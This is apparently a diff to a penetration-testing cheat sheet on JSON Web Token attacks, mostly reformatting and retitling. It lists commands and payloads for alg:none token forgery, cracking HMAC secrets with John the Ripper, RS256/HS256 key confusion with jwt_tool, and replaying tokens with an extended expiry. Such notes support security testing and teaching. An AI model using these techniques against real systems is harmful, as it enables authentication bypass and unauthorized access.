@@ -1,10 +1,14 @@
-## Identifying JWT Usage
+# JWT Attacks
 
 !!! tip "Tip"
     Try `alg: none` first — some libraries still accept unsigned tokens. If RS256 is used, check if the public key is exposed (e.g. `/jwks.json`) and try switching to HS256 signed with the public key as the secret.
 
 !!! warning "Watch out"
     JWT signature validation failures often return a generic 401 — confirm you're actually testing the right field by checking what the app decodes, not just what it rejects.
+
+---
+
+## Identifying JWT Usage
 
 ### Using Burp Suite
 
@@ -13,16 +17,17 @@
 
 ### Extracting JWT from cURL Responses
 
-```
-curl -v http://<target-ip>/api -H "Authorization: Bearer <JWT>"
+```bash
+curl -v http://10.10.10.10/api -H "Authorization: Bearer <JWT>"
 ```
 
-- `-v` → Enables verbose output to inspect headers.
 ### Decoding a JWT
 
-```
+```bash
 echo "<JWT Token>" | jwt_tool -d
 ```
+
+---
 
 ## Common JWT Attacks
 
@@ -30,7 +35,7 @@ echo "<JWT Token>" | jwt_tool -d
 
 If the server does not validate the algorithm field properly, change it to `none` and remove the signature.
 
-```
+```json
 {
   "alg": "none",
   "typ": "JWT"
@@ -39,25 +44,24 @@ If the server does not validate the algorithm field properly, change it to `none
 
 Replay the modified token:
 
-```
-curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api
+```bash
+curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
 ```
 
 ### Signature Forgery with Weak Secrets
 
-If a weak secret is used to sign the JWT, brute-force it with **John the Ripper**:
+Brute-force a weak secret with John the Ripper:
 
-```
+```bash
 echo "<JWT_SECRET>" > jwt_secret.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_secret.txt
 ```
 
-- Attempts to recover the secret key.
 ### Key Confusion Attack
 
-If the server accepts **public keys** for verification, attempt to sign the JWT with a known key.
+If the server accepts public keys for verification, attempt to sign the JWT with a known key:
 
-```
+```bash
 jwt_tool -I -S rsa256 -pk mypublic.pem
 ```
 
@@ -68,14 +72,14 @@ jwt_tool -I -S rsa256 -pk mypublic.pem
 
 If the server does not properly validate token expiration (`exp` claim), modify and replay it:
 
-```
+```json
 {
   "exp": 9999999999
 }
 ```
 
-Encode and replay:
+Replay:
 
-```
-curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api
+```bash
+curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
 ```
